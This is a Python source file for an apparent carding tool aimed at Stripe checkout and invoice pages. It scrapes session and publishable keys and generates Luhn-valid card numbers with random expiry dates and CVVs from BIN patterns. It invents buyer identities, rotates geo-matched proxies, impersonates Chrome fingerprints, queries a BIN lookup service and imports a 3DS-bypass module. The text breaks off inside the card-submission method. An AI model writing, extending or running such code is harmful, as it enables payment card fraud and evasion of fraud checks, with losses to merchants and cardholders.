import re
import json
import time
import random
import asyncio
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional
from curl_cffi import requests as cffi_requests
from curl_compat import ChromeSession
from dotenv import load_dotenv
from gateways.stripe.stripe_3ds_bypasser import Stripe3DSBypasser
from gateways.stripe.stripe_fid import decode_fragment

load_dotenv()

# ============= CONFIGURATION =============
MAX_ATTEMPTS = 10
CONCURRENT_BATCH_SIZE = 10
BATCH_DELAY = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

STRIPE_DECLINE_CODES = {
    "generic_decline": "Card declined by issuer",
    "incorrect_cvv": "CVV verification failed",
    "insufficient_funds": "Insufficient funds",
    "expired_card": "Card has expired",
    "incorrect_number": "Invalid card number",
    "invalid_cvc": "Invalid security code",
    "do_not_honor": "Transaction declined by bank",
    "fraudulent": "Fraud detection triggered",
    "lost_card": "Card reported lost",
    "stolen_card": "Card reported stolen",
    "processing_error": "Processor error",
    "authentication_required": "3DS required",
    "card_declined": "Card declined",
    "rate_limit": "Too many attempts - Slow down",
    "transaction_not_allowed": "Transaction not allowed",
}


# ============= STRIPE API EXTRACTOR =============

class StripeAPIExtractor:
    @staticmethod
    def extract_cs_live(url: str, html: str) -> Optional[str]:
        patterns = [
            r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)',
            r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)',
            r'cs_[a-z]+_[a-zA-Z0-9]+',
        ]
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1) if '(' in pattern else match.group(0)
        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None

    @staticmethod
    def extract_pk_live(html: str) -> Optional[str]:
        patterns = [
            r'pk_[a-z]+_[a-zA-Z0-9]+',
            r'"publishableKey":"(pk_[a-z]+_[a-zA-Z0-9]+)"',
            r'data-stripe-publishable-key="(pk_[a-z]+_[a-zA-Z0-9]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1) if '(' in pattern else match.group(0)
        return None

    @staticmethod
    def extract_details_from_url_hash(url_str: str) -> dict:
        res = {"pk_key": None, "stripe_account": None}
        if not url_str or "#" not in url_str:
            return res
        try:
            import urllib.parse, base64, json
            hash_str = url_str.split("#", 1)[1]
            hash_str = hash_str.split("?", 1)[0]
            decoded = urllib.parse.unquote(hash_str)
            raw_bytes = base64.b64decode(decoded + "==")
            json_str = "".join(chr(b ^ 5) for b in raw_bytes)
            data = json.loads(json_str)
            res["pk_key"] = data.get("apiKey")
            res["stripe_account"] = data.get("stripeAccount")
        except Exception:
            pass
        return res

    @staticmethod
    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str,
                                 stripe_account: Optional[str] = None) -> Dict:
        try:
            url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
            headers = {
                "authority": "api.stripe.com",
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": random.choice(USER_AGENTS),
            }
            if stripe_account:
                headers["Stripe-Account"] = stripe_account
            data = {
                "key": pk_live, "eid": "NA",
                "browser_locale": "en-US", "browser_timezone": "-300",
                "redirect_type": "url",
            }
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get("username") else ""
                server = proxy_data["server"]
                scheme = server.split("://")[0] if "://" in server else "http"
                server_host = server.split("://")[-1]
                proxy_url = f"{scheme}://{auth}{server_host}"
                proxies = {"http": proxy_url, "https": proxy_url}

            loop = asyncio.get_running_loop()
            response = await loop.run_in_executor(
                None, lambda: cffi_requests.post(
                    url, headers=headers, data=data, proxies=proxies,
                    timeout=5, impersonate="chrome120"))
            if response.status_code == 200:
                resp_json = response.json()
                amount = None
                merchant = "Unknown"

                invoice = resp_json.get("invoice")
                if isinstance(invoice, dict):
                    if invoice.get("amount_due") is not None:
                        amount = invoice["amount_due"]
                    elif invoice.get("total") is not None:
                        amount = invoice["total"]

                if amount is None:
                    ts = resp_json.get("total_summary")
                    if isinstance(ts, dict):
                        if ts.get("due") is not None:
                            amount = ts["due"]
                        elif ts.get("total") is not None:
                            amount = ts["total"]

                if amount is None:
                    lig = resp_json.get("line_item_group")
                    if lig and isinstance(lig, dict) and lig.get("total") is not None:
                        amount = lig["total"]
                    elif resp_json.get("amount") is not None:
                        amount = resp_json["amount"]
                    elif resp_json.get("payment_intent") and isinstance(resp_json["payment_intent"], dict) and resp_json["payment_intent"].get("amount") is not None:
                        amount = resp_json["payment_intent"]["amount"]
                    else:
                        def _find_amount(d):
                            if isinstance(d, dict):
                                for k in ["amount_total", "amount_due"]:
                                    if k in d and isinstance(d[k], int):
                                        return d[k]
                                for v in d.values():
                                    res = _find_amount(v)
                                    if res is not None:
                                        return res
                            elif isinstance(d, list):
                                for item in d:
                                    res = _find_amount(item)
                                    if res is not None:
                                        return res
                            return None
                        amount = _find_amount(resp_json)

                site_domain = None
                acct = resp_json.get("account_settings")
                if acct and isinstance(acct, dict):
                    if acct.get("display_name"):
                        merchant = acct["display_name"]
                    burl = acct.get("business_url") or resp_json.get("management_url") or resp_json.get("business_url")
                    if burl:
                        try:
                            import urllib.parse
                            site_domain = urllib.parse.urlparse(burl).netloc or burl
                        except Exception:
                            site_domain = burl
                elif resp_json.get("statement_descriptor"):
                    merchant = resp_json["statement_descriptor"]

                currency = resp_json.get("currency", "usd").upper()

                locked_email = None
                if resp_json.get("customer_email"):
                    locked_email = resp_json["customer_email"]
                elif resp_json.get("prefilled_email"):
                    locked_email = resp_json["prefilled_email"]
                elif resp_json.get("email"):
                    locked_email = resp_json["email"]
                elif isinstance(resp_json.get("customer"), dict) and resp_json["customer"].get("email"):
                    locked_email = resp_json["customer"]["email"]
                elif isinstance(resp_json.get("customer_details"), dict) and resp_json["customer_details"].get("email"):
                    locked_email = resp_json["customer_details"]["email"]

                tax_country = None
                tax_zip = None
                if resp_json.get("tax_context") and resp_json["tax_context"].get("customer_tax_country"):
                    tax_country = resp_json["tax_context"]["customer_tax_country"]
                elif isinstance(resp_json.get("customer"), dict) and resp_json["customer"].get("address") and resp_json["customer"]["address"].get("country"):
                    tax_country = resp_json["customer"]["address"]["country"]
                    tax_zip = resp_json["customer"]["address"].get("postal_code")

                return {
                    "success": True,
                    "amount": f"{currency} {amount/100:.2f}" if amount is not None else None,
                    "raw_amount": amount,
                    "merchant": merchant,
                    "site_domain": site_domain,
                    "locked_email": locked_email,
                    "tax_country": tax_country,
                    "tax_zip": tax_zip,
                    "init_checksum": resp_json.get("init_checksum"),
                    "init_json": resp_json,
                }

            try:
                err_msg = response.json().get("error", {}).get("message", f"Status {response.status_code}")
            except Exception:
                err_msg = f"Status {response.status_code}"
            return {"success": False, "error": err_msg}
        except Exception as e:
            return {"success": False, "error": f"Connection failed: {str(e)}"}

    @staticmethod
    async def fetch_invoice_data(user_id: int, url: str) -> Dict:
        try:
            import urllib.parse
            parsed = urllib.parse.urlparse(url)
            path_parts = [p for p in parsed.path.split("/") if p]
            if len(path_parts) < 3 or path_parts[0] != "i":
                return {"success": False, "error": "Invalid invoice URL format"}

            merchant_token = path_parts[1]
            invoice_secret = path_parts[2]

            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get("username") else ""
                server = proxy_data["server"]
                scheme = server.split("://")[0] if "://" in server else "http"
                server_host = server.split("://")[-1]
                proxy_url = f"{scheme}://{auth}{server_host}"
                proxies = {"http": proxy_url, "https": proxy_url}

            invoicedata_url = f"https://invoicedata.stripe.com/hosted_invoice_page/{merchant_token}/{invoice_secret}"

            headers = {
                "accept": "application/json",
                "origin": "https://invoice.stripe.com",
                "referer": "https://invoice.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }

            loop = asyncio.get_running_loop()
            resp = await loop.run_in_executor(
                None, lambda: cffi_requests.get(
                    invoicedata_url, headers=headers, proxies=proxies,
                    timeout=10, impersonate="chrome120"))
            if resp.status_code != 200:
                return {"success": False, "error": f"Failed invoicedata check: {resp.status_code}"}

            res_json = resp.json()
            pk_key = res_json.get("publishable_key")
            ek = res_json.get("ephemeral_key")
            invoice_id = res_json.get("invoice_id")

            if not pk_key or not ek or not invoice_id:
                return {"success": False, "error": "Missing elements in invoicedata response"}

            hosted_url = f"https://api.stripe.com/v1/invoices/{invoice_id}/hosted"
            hosted_headers = {
                "accept": "application/json",
                "authorization": f"Bearer {ek}",
                "stripe-version": "2020-03-02",
                "user-agent": headers["user-agent"],
            }

            hosted_resp = await loop.run_in_executor(
                None, lambda: cffi_requests.get(
                    hosted_url, headers=hosted_headers, proxies=proxies,
                    timeout=10, impersonate="chrome120"))
            if hosted_resp.status_code != 200:
                return {"success": False, "error": f"Failed invoices/hosted check: {hosted_resp.status_code}"}

            hosted_json = hosted_resp.json()
            pi = hosted_json.get("payment_intent")
            pi_cs = None
            if isinstance(pi, dict):
                pi_cs = pi.get("client_secret")

            if not pi_cs:
                return {"success": False, "error": "No active payment intent found on invoice"}

            amount = hosted_json.get("amount_due") or hosted_json.get("total")
            currency = hosted_json.get("currency", "usd").upper()
            merchant = "Unknown"
            acct = res_json.get("merchant")
            if acct and isinstance(acct, dict) and acct.get("business_name"):
                merchant = acct["business_name"]

            locked_email = hosted_json.get("customer_email") or res_json.get("prefilled_email")

            return {
                "success": True,
                "cs_token": pi_cs,
                "pk_key": pk_key,
                "amount": f"{currency} {amount/100:.2f}" if amount is not None else None,
                "raw_amount": amount,
                "merchant": merchant,
                "locked_email": locked_email,
            }
        except Exception as e:
            return {"success": False, "error": str(e)}


# ============= PROXY MANAGER =============

class ProxyManager:
    db_pool = None
    _in_memory_pools: Dict[int, List[Dict]] = {}

    @classmethod
    async def init_db(cls, db_pool):
        """Idempotent — safe to call multiple times."""
        if cls.db_pool is not None and cls.db_pool is db_pool:
            return
        cls.db_pool = db_pool
        if db_pool:
            try:
                async with db_pool.acquire() as conn:
                    rows = await conn.fetch(
                        "SELECT user_id, raw AS proxy_raw, server, username, password, country FROM proxies WHERE alive = TRUE"
                    )
                    for row in rows:
                        uid = row["user_id"]
                        entry = {
                            "raw": row["proxy_raw"],
                            "server": row["server"],
                            "username": row["username"],
                            "password": row["password"],
                        }
                        if row["country"]:
                            cls._geo_cache[row["server"]] = row["country"].upper()
                        cls._in_memory_pools.setdefault(uid, []).append(entry)
            except Exception as e:
                print(f"ProxyManager DB prefetch warning: {e}")

    @classmethod
    async def get_user_proxies(cls, user_id: int) -> List[Dict]:
        if cls.db_pool:
            try:
                async with cls.db_pool.acquire() as conn:
                    rows = await conn.fetch(
                        "SELECT raw, server, username, password FROM proxies WHERE user_id = $1 AND alive = TRUE",
                        user_id,
                    )
                    if rows:
                        parsed = [dict(r) for r in rows]
                        cls._in_memory_pools[user_id] = parsed
                        return parsed
            except Exception:
                pass
        return cls._in_memory_pools.get(user_id, [])

    @classmethod
    async def get_all_users(cls) -> List[int]:
        users = set(cls._in_memory_pools.keys())
        if cls.db_pool:
            try:
                async with cls.db_pool.acquire() as conn:
                    rows = await conn.fetch("SELECT DISTINCT user_id FROM proxies WHERE alive = TRUE")
                    for r in rows:
                        users.add(r["user_id"])
            except Exception:
                pass
        return list(users)

    @classmethod
    async def save_user_proxies(cls, user_id: int, proxies: List[Dict]):
        cls._in_memory_pools[user_id] = proxies
        if cls.db_pool:
            try:
                async with cls.db_pool.acquire() as conn:
                    for p in proxies:
                        await conn.execute(
                            """INSERT INTO proxies (user_id, raw, server, username, password)
                               VALUES ($1, $2, $3, $4, $5)
                               ON CONFLICT (user_id, raw) DO NOTHING""",
                            user_id, p["raw"], p["server"],
                            p.get("username"), p.get("password"),
                        )
            except Exception as e:
                print(f"ProxyManager save DB error: {e}")

    @classmethod
    async def load(cls, user_id: int, raw_text: str) -> int:
        from proxies import parse_proxy as _parse
        pool = await cls.get_user_proxies(user_id)
        added = 0
        for line in raw_text.splitlines():
            p = _parse(line)
            if p:
                pool.append(p)
                added += 1
        if added > 0:
            await cls.save_user_proxies(user_id, pool)
        return added

    @classmethod
    async def get_random(cls, user_id: int) -> Optional[Dict]:
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None
        return random.choice(pool)

    @classmethod
    async def remove(cls, user_id: int, proxy_raw: str):
        pool = await cls.get_user_proxies(user_id)
        new_pool = [p for p in pool if p["raw"] != proxy_raw]
        if len(new_pool) != len(pool):
            await cls.save_user_proxies(user_id, new_pool)

    @classmethod
    async def clear(cls, user_id: int):
        await cls.save_user_proxies(user_id, [])

    @classmethod
    async def get_count(cls, user_id: int) -> int:
        pool = await cls.get_user_proxies(user_id)
        return len(pool)

    @classmethod
    async def has_proxies(cls, user_id: int) -> bool:
        return await cls.get_count(user_id) > 0

    _geo_cache: Dict[str, str] = {}

    @classmethod
    async def get_geo_matched(cls, user_id: int, target_country: str) -> Optional[Dict]:
        if not target_country:
            return await cls.get_random(user_id)
        target = target_country.upper()
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None

        matches = [p for p in pool if cls._geo_cache.get(p.get("server", ""), "").upper() == target]
        if matches:
            return random.choice(matches)

        uncached = [p for p in pool if p.get("server", "") not in cls._geo_cache]
        if uncached:
            random.shuffle(uncached)

            async def _check_geo(proxy):
                try:
                    auth_str = f"{proxy['username']}:{proxy['password']}@" if proxy.get("username") else ""
                    raw_srv = proxy["server"].replace("http://", "").replace("socks5://", "").replace("socks4://", "")
                    purl = f"http://{auth_str}{raw_srv}"
                    async with aiohttp.ClientSession() as sess:
                        async with sess.get(
                            "http://ip-api.com/json/?fields=countryCode",
                            proxy=purl,
                            timeout=aiohttp.ClientTimeout(total=1.5),
                        ) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                cc = (data.get("countryCode") or "").upper()
                                cls._geo_cache[proxy.get("server", "")] = cc
                                return proxy if cc == target else None
                except Exception:
                    pass
                return None

            results = await asyncio.gather(*[_check_geo(p) for p in uncached[:5]], return_exceptions=True)
            valid_matches = [r for r in results if isinstance(r, dict) and r]
            if valid_matches:
                return random.choice(valid_matches)

        return random.choice(pool)


# ============= RANDOM DATA =============

class RandomData:
    FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
                   "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"]
    LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    STREETS = ["Main St", "Oak Ave", "Maple Rd", "Pine Ln", "Cedar Dr", "Elm St", "Washington Blvd", "Lake Shore Dr"]
    CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego"]
    STATES = ["CA", "NY", "TX", "FL", "IL", "PA", "OH", "GA", "NC", "MI"]
    ZIP_CODES = ["10001", "90210", "60601", "77001", "85001", "19101", "78201", "92101"]

    @staticmethod
    def get_name():
        return f"{random.choice(RandomData.FIRST_NAMES)} {random.choice(RandomData.LAST_NAMES)}"

    @staticmethod
    def get_email():
        return f"dlx{random.randint(1000, 99999)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"

    @staticmethod
    def get_phone():
        return f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"

    _geo_cache = {}

    @staticmethod
    async def get_address_and_timezone(proxy_url: Optional[str] = None):
        if proxy_url and proxy_url in RandomData._geo_cache:
            return RandomData._geo_cache[proxy_url]

        timezone_id = "America/New_York"
        US_PLACES = [
            ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"),
            ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"),
            ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101"),
            ("San Antonio", "TX", "78201"), ("San Diego", "CA", "92101"),
            ("Dallas", "TX", "75201"), ("Austin", "TX", "73301"),
            ("Seattle", "WA", "98101"), ("Miami", "FL", "33101"),
            ("Boston", "MA", "02108"), ("Atlanta", "GA", "30301"),
            ("Denver", "CO", "80014"), ("Nashville", "TN", "37201"),
            ("Portland", "OR", "97201"), ("Detroit", "MI", "48201"),
        ]
        _city, _state, _zip = random.choice(US_PLACES)
        address = {
            "line1": f"{random.randint(100, 9999)} {random.choice(RandomData.STREETS)}",
            "city": _city, "state": _state, "zip": _zip, "country": "US",
        }

        locales = {
            "US": "en-US", "GB": "en-GB", "CA": "en-CA", "AU": "en-AU",
            "FR": "fr-FR", "DE": "de-DE", "ES": "es-ES", "IT": "it-IT",
            "JP": "ja-JP", "BR": "pt-BR", "MX": "es-MX", "IN": "en-IN",
            "NL": "nl-NL", "RU": "ru-RU", "KR": "ko-KR", "CN": "zh-CN",
            "SE": "sv-SE", "TR": "tr-TR", "ZA": "en-ZA", "SG": "en-SG",
        }

        if proxy_url:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        "http://ip-api.com/json/", proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get("timezone"):
                                timezone_id = data["timezone"]
                            new_country = data.get("countryCode")
                            if new_country:
                                fallback_addresses = {
                                    "US": {"zip": "10001", "city": "New York", "state": "NY"},
                                    "GB": {"zip": "SW1A 1AA", "city": "London", "state": "London"},
                                    "CA": {"zip": "M5V 2L7", "city": "Toronto", "state": "ON"},
                                    "AU": {"zip": "2000", "city": "Sydney", "state": "NSW"},
                                    "FR": {"zip": "75001", "city": "Paris", "state": "Paris"},
                                    "DE": {"zip": "10115", "city": "Berlin", "state": "Berlin"},
                                    "IT": {"zip": "00118", "city": "Roma", "state": "RM"},
                                    "ES": {"zip": "28001", "city": "Madrid", "state": "Madrid"},
                                    "BR": {"zip": "01000-000", "city": "Sao Paulo", "state": "SP"},
                                    "MX": {"zip": "06000", "city": "Ciudad de Mexico", "state": "DF"},
                                    "IN": {"zip": "110001", "city": "New Delhi", "state": "Delhi"},
                                    "JP": {"zip": "100-0001", "city": "Chiyoda-ku", "state": "Tokyo"},
                                    "SG": {"zip": "018956", "city": "Singapore", "state": "Singapore"},
                                    "AE": {"zip": "00000", "city": "Dubai", "state": "Dubai"},
                                    "CH": {"zip": "1000", "city": "Lausanne", "state": "VD"},
                                    "NL": {"zip": "1011 AB", "city": "Amsterdam", "state": "North Holland"},
                                    "SE": {"zip": "111 22", "city": "Stockholm", "state": "Stockholm"},
                                    "NO": {"zip": "0150", "city": "Oslo", "state": "Oslo"},
                                    "DK": {"zip": "1000", "city": "Kobenhavn", "state": "Kobenhavn"},
                                    "FI": {"zip": "00100", "city": "Helsinki", "state": "Uusimaa"},
                                    "AT": {"zip": "1010", "city": "Wien", "state": "Wien"},
                                    "BE": {"zip": "1000", "city": "Bruxelles", "state": "Bruxelles"},
                                    "PT": {"zip": "1000-001", "city": "Lisboa", "state": "Lisboa"},
                                    "NZ": {"zip": "1010", "city": "Auckland", "state": "Auckland"},
                                    "TW": {"zip": "100", "city": "Taipei", "state": "Taipei"},
                                    "HK": {"zip": "000000", "city": "Hong Kong", "state": "Hong Kong"},
                                    "MY": {"zip": "50000", "city": "Kuala Lumpur", "state": "Kuala Lumpur"},
                                    "TH": {"zip": "10100", "city": "Bangkok", "state": "Bangkok"},
                                    "VN": {"zip": "70000", "city": "Ho Chi Minh City", "state": "Ho Chi Minh City"},
                                    "PH": {"zip": "1000", "city": "Manila", "state": "Metro Manila"},
                                    "ID": {"zip": "10110", "city": "Jakarta", "state": "DKI Jakarta"},
                                    "KR": {"zip": "01000", "city": "Seoul", "state": "Seoul"},
                                }
                                if new_country in fallback_addresses:
                                    addr_data = fallback_addresses[new_country]
                                    address["country"] = new_country
                                    address["zip"] = addr_data["zip"]
                                    address["city"] = addr_data["city"]
                                    address["state"] = addr_data["state"]
            except Exception:
                pass

        locale = locales.get(address["country"], "en-US")
        result_tuple = (address, timezone_id, locale)
        if proxy_url:
            RandomData._geo_cache[proxy_url] = result_tuple
        return result_tuple


# ============= BIN LOOKUP =============

class BINLookup:
    _cache: Dict[str, Dict] = {}

    @classmethod
    async def lookup(cls, card_number: str) -> Dict:
        bin6 = card_number[:6]
        if bin6 in cls._cache:
            return cls._cache[bin6]
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://bins.antipublic.cc/bins/{bin6}",
                    timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        result = {
                            "country": (data.get("countrycode") or "").upper(),
                            "country_name": data.get("country", ""),
                            "bank": data.get("bank", ""),
                            "brand": data.get("brand", ""),
                            "type": data.get("type", ""),
                            "level": data.get("level", ""),
                        }
                        cls._cache[bin6] = result
                        return result
        except Exception:
            pass
        fallback = {"country": "", "country_name": "", "bank": "", "brand": "", "type": "", "level": ""}
        cls._cache[bin6] = fallback
        return fallback


# ============= CARD GENERATOR =============

class CardGenerator:
    @staticmethod
    def luhn(card: str) -> int:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10

    @staticmethod
    def generate(bin_pattern: str) -> Optional[Dict]:
        if not bin_pattern:
            return None
        parts = bin_pattern.split("|")
        bin_clean = re.sub(r"[^0-9xX]", "", parts[0])
        is_amex = bin_clean.startswith(("34", "37"))
        target_len = 15 if is_amex else 16
        cvv_len = 4 if is_amex else 3
        card = ""
        for c in bin_clean:
            card += str(random.randint(0, 9)) if c.lower() == "x" else c
        if len(card) >= target_len:
            card = card[:target_len - 1]
        remaining = target_len - len(card) - 1
        if remaining > 0:
            for _ in range(remaining):
                card += str(random.randint(0, 9))
        for i in range(10):
            if CardGenerator.luhn(card + str(i)) == 0:
                full_card = card + str(i)
                break
        else:
            full_card = card + "0"
        if len(full_card) != target_len:
            full_card = full_card[:target_len]
        _mm_raw = parts[1] if len(parts) > 1 else ""
        _yy_raw = parts[2] if len(parts) > 2 else ""
        _cv_raw = parts[3] if len(parts) > 3 else ""
        month = _mm_raw.zfill(2) if _mm_raw and _mm_raw.lower() not in ("xx", "") else f"{random.randint(1, 12):02d}"
        year = _yy_raw.zfill(2) if _yy_raw and _yy_raw.lower() not in ("xx", "") else f"{(datetime.now().year + random.randint(1, 5)) % 100:02d}"
        if is_amex and _cv_raw and len(_cv_raw) < 4:
            cvv = _cv_raw + str(random.randint(0, 9))
        else:
            cvv = _cv_raw if _cv_raw and _cv_raw.lower() not in ("xxx", "xxxx", "") else "".join(str(random.randint(0, 9)) for _ in range(cvv_len))
        return {"card": full_card, "month": month, "year": year, "cvv": cvv}


# ============= HELPERS =============

def find_receipt_url(d):
    if isinstance(d, dict):
        for key in ["receipt_url", "hosted_invoice_url", "invoice_pdf"]:
            val = d.get(key)
            if isinstance(val, str) and val.startswith("http"):
                return val
        for v in d.values():
            res = find_receipt_url(v)
            if res:
                return res
    elif isinstance(d, list):
        for item in d:
            res = find_receipt_url(item)
            if res:
                return res
    return None


def extract_intent_details(d):
    intent_id = None
    client_secret = None

    if isinstance(d, dict):
        for key in ["payment_intent", "setup_intent"]:
            val = d.get(key)
            if isinstance(val, dict):
                intent_id = val.get("id")
                client_secret = val.get("client_secret")
                if intent_id and client_secret:
                    return intent_id, client_secret
            elif isinstance(val, str) and (val.startswith("pi_") or val.startswith("seti_")):
                intent_id = val

        cs_client_secret = d.get("payment_intent_client_secret") or d.get("setup_intent_client_secret")
        if cs_client_secret:
            client_secret = cs_client_secret

        intent_id = intent_id or d.get("id")
        client_secret = client_secret or d.get("client_secret")
        if intent_id and client_secret:
            return intent_id, client_secret

        for v in d.values():
            if isinstance(v, (dict, list)):
                i_id, c_sec = extract_intent_details(v)
                if i_id and c_sec:
                    return i_id, c_sec

    elif isinstance(d, list):
        for item in d:
            i_id, c_sec = extract_intent_details(item)
            if i_id and c_sec:
                return i_id, c_sec

    return intent_id, client_secret


def extract_deep_decline(data):
    if not isinstance(data, dict):
        return None, None
    err = data.get("error", {})
    if isinstance(err, dict) and (err.get("code") or err.get("decline_code") or err.get("message")):
        decline = err.get("decline_code") or err.get("code") or err.get("type")
        msg = err.get("message")
        return decline, msg

    for key in ["payment_intent", "setup_intent"]:
        obj = data.get(key)
        if isinstance(obj, dict):
            last_err = obj.get("last_payment_error") or obj.get("last_setup_error")
            if isinstance(last_err, dict):
                decline = last_err.get("decline_code") or last_err.get("code") or last_err.get("type")
                msg = last_err.get("message")
                if decline or msg:
                    return decline, msg

    last_err = data.get("last_payment_error") or data.get("last_setup_error")
    if isinstance(last_err, dict):
        decline = last_err.get("decline_code") or last_err.get("code") or last_err.get("type")
        msg = last_err.get("message")
        if decline or msg:
            return decline, msg

    return None, None


# ============= MAIN STRIPE API HITTER =============

class StripeAPIHitter:
    _live_js_hash_cache = None

    @staticmethod
    def _fetch_live_stripe_js_hash():
        if StripeAPIHitter._live_js_hash_cache:
            return StripeAPIHitter._live_js_hash_cache
        try:
            resp = cffi_requests.get("https://js.stripe.com/v3/", timeout=8, impersonate="chrome124")
            if resp.status_code == 200:
                text = resp.text[:5000]
                match = re.search(r'fingerprinted/js/[\w-]+-([a-f0-9]{10,40})\.js', text)
                if match:
                    StripeAPIHitter._live_js_hash_cache = match.group(1)[:10]
                    return StripeAPIHitter._live_js_hash_cache
        except Exception:
            pass
        fallback_hashes = ["da394b0aef", "e7f8b910a2", "b4c82d910f", "8a9f0b12e3"]
        StripeAPIHitter._live_js_hash_cache = random.choice(fallback_hashes)
        return StripeAPIHitter._live_js_hash_cache

    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict,
                 raw_amount: int = None, locked_email: str = None,
                 stripe_account: str = None, tax_country: str = None,
                 tax_zip: str = None, init_json: dict = None,
                 full_page_url: str = None):
        self.pk_live = pk_live or ""
        self.cs_live = cs_live
        self.proxy_data = proxy_data
        self.raw_amount = raw_amount
        self.locked_email = locked_email
        self.stripe_account = stripe_account
        self.tax_country = tax_country
        self.tax_zip = tax_zip
        self._init_json = init_json or {}
        self.full_page_url = full_page_url

        self.merchant = "Unknown"
        self.site_domain = None
        self.amount = None
        if self._init_json:
            acct = self._init_json.get("account_settings") or {}
            self.merchant = acct.get("display_name") or self._init_json.get("statement_descriptor") or "Unknown"
            burl = acct.get("business_url")
            if burl:
                try:
                    import urllib.parse
                    self.site_domain = urllib.parse.urlparse(burl).netloc or burl
                except Exception:
                    self.site_domain = burl
            curr = self._init_json.get("currency", "usd").upper()
            if self.raw_amount is not None:
                self.amount = f"{curr} {self.raw_amount/100:.2f}"
            elif self._init_json.get("total_summary", {}).get("total") is not None:
                tot = self._init_json["total_summary"]["total"]
                self.amount = f"{curr} {tot/100:.2f}"

    async def _scrape_pk_live(self, proxies: dict, profile: dict) -> Optional[str]:
        """Scrape pk_live for the current cs_live/pi_live if not provided at init."""
        if self.pk_live:
            return self.pk_live

        # 1. Try from URL hash
        if self.full_page_url and "#" in self.full_page_url:
            det = StripeAPIExtractor.extract_details_from_url_hash(self.full_page_url)
            if det.get("pk_key"):
                self.pk_live = det["pk_key"]
                return self.pk_live

        # 2. Try from payment_pages init (page HTML sometimes leaked)
        try:
            page_url = self.full_page_url or f"https://checkout.stripe.com/c/pay/{self.cs_live}"
            loop = asyncio.get_running_loop()
            r = await loop.run_in_executor(
                None, lambda: cffi_requests.get(
                    page_url,
                    headers={"User-Agent": profile["user_agent"]},
                    proxies=proxies, timeout=10,
                    impersonate=profile["impersonate"]))
            if r.status_code == 200:
                pk = StripeAPIExtractor.extract_pk_live(r.text)
                if pk:
                    self.pk_live = pk
                    return pk
        except Exception:
            pass

        # 3. Try from payment_pages endpoint directly (returns JSON with pk sometimes)
        try:
            if self.cs_live.startswith("cs_"):
                init_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/init"
                loop = asyncio.get_running_loop()
                r2 = await loop.run_in_executor(
                    None, lambda: cffi_requests.post(
                        init_url,
                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                 "User-Agent": profile["user_agent"]},
                        data={"key": "", "eid": "NA", "browser_locale": "en-US",
                              "browser_timezone": "-300", "redirect_type": "url"},
                        proxies=proxies, timeout=8,
                        impersonate=profile["impersonate"]))
                if r2.status_code == 200:
                    pk = r2.json().get("publishable_key")
                    if pk:
                        self.pk_live = pk
                        return pk
        except Exception:
            pass

        return None

    async def hit(self, card: Dict, attempt: int, user_id: int,
                  cached_stripe_tokens: dict = None) -> Dict:
        start = time.time()
        result = {
            "attempt": attempt, "card": card, "success": False,
            "decline_code": None, "response_time": 0,
            "amount": self.amount, "merchant": self.merchant,
            "site_domain": self.site_domain, "proxy_raw": None,
            "error": None, "raw_response": None, "is_live": None,
            "3ds_bypassed": False, "3ds_type": None, "3ds_attempted": False,
            "captcha_bypassed": False, "confirm_url": None,
        }

        BROWSER_PROFILES = [
            {
                "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                "impersonate": "chrome124", "platform": "Android",
                "color_depth": "24", "screen_height": "892", "screen_width": "412",
